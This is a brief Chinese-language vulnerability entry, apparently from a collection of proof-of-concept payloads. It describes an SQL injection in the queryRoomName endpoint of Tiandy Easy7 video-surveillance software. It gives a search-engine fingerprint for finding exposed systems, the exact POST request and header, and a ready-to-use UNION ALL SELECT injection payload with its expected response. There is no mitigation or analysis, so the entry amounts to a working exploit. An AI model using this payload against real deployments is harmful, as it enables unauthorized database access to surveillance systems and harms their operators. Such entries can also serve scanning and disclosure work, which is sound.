# 天地伟业Easy7queryRoomName存在SQL注入漏洞

- **系统**：天地伟业　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="Tiandy-Easy7"`
- **请求**：`POST /Easy7/rest/inquestRoom/queryRoomName HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
roomName=' UNION ALL SELECT CONCAT(0x7178766b71,0x4f4c5062456650564865766e6d4c6f4d6a535674627748485466576b7a4a46427370624e6145556f,0x716a6a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```
- **预期**：200　|　—